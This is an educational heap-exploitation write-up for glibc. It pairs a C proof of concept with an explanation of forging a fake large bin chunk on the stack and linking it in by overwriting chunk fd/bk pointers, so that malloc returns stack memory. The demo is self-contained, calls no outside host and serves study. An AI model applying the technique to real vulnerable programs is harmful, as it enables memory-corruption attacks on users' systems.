<details>
<summary><strong>Description</strong></summary>
<p>

Similar to the unsorted bin linked list, our goal is to allocate a ptr on the stack from malloc. However this time we will be leveraging the large bin. However, the process will be pretty similar...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk1, *chunk2, stack_array[140], *chunk3;

    // allocate two big chunks
    chunk1 = malloc(0x420);
    malloc(0x18); // padding chunk to prevent consolidation
    chunk2 = malloc(0x420);
    malloc(0x18); // padding chunk to prevent consolidation

    free(chunk1); // insert them into the unsorted bin
    free(chunk2);

    // malloc a chunk larger than any other unsorted bin chunks to move the three chunks over to the large bin
    malloc(0x420 + 0x10);
    // [largebin 0x400-0x430]: chunk1 -> chunk2

    // create the large bin fake chunk header
    // stack_array[0] = 0x000; // fake chunk's prev_size (usually we dont need to care about this)
    stack_array[1] = 0x431; // fake chunk's size (turn on the prev_inuse for easier)

    // add a fake heap chunk header, right after the end of our fake large bin bin chunk
    // this is because there are checks for the next adjacent chunk since if malloc properly allocated this (fake) chunk, there would be one there
    stack_array[134] = 0x430; // fake adjacent chunk prev_size
    stack_array[135] = 0x050; // fake adjacent chunk size (turn off the prev_inuse)

    // set the fwd/bk pointers of our large bin fake chunk, so that they point to the two chunks were linking to here
    stack_array[2] = ((long)chunk2 - 0x10); // fwd
    stack_array[3] = ((long)chunk1 - 0x10); // bk

    // clear out the fd_nextsize/bk_nexsize of large bin skiplist
    stack_array[4] = 0x00;
    stack_array[5] = 0x00;

    /*VULNERABILITY*/
    chunk1[0] = (long)(stack_array); // fwd
    chunk2[1] = (long)(stack_array); // bk
    /*VULNERABILITY*/
    // [largebin 0x400-0x430]: chunk1 -> fake_chunk -> chunk2

    // allocate our fake large bin chunk that is on the stack
    chunk3 = malloc(0x420);

    printf("chunk3: %p\n", chunk3);
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

this is going to be pretty similar to the unsorted bin linked list demo. The primary differences here include, that we are doing it with large bin chunks instead of the unsorted bin. In addition to that, since we are dealing with large bin chunks, I am having to set the skiplist ptrs (fd_nextsize/bk_nexsize) to 0x00, to prevent issues (if we leave it as whatever was on the stack, it will interpret that data as memory addresses, and try to dereference them, which can cause issues).

so just to recap on how this works. We will get 2 chunks into the large bin via several mallocs/frees. These 2 chunks will be the same size. Since they are the same size, only one of these chunks will be in the large bin skip list. Then we will continue with creating a fake chunk on the stack. This includes setting the prev_size (0x00), chunk size (0x431), fwd/bk ptrs, and skip_list ptrs (0x00). In addition to that, we will need to set the fake chunk header after our chunk (prev_size of 0x430 to match our fake chunk size).

after that, we will insert our fake stack large bin chunk into the large bin. We will simply set the fwd/bk pointers to match our fake stack chunk, and vice versa. Since we aren't dealing with skip list chunks, this simplifies the process. With that, we have effectively inserted our fake stack chunk into the large bin.

after that, all that is left is to allocate it. If there are multiple chunks of the same size in the large bin, the large bin will allocate chunks not in the skip list first, so it doesn't have to update the skip list. So it will directly allocate our fake chunk, which is the foward chunk of the one has skip list.

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/bin_overviews/large_bins.md
- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/large_bin/linked_list/readme.md
> i modified it a little bit (easier) (but it's worth to read)

</p>
</summary>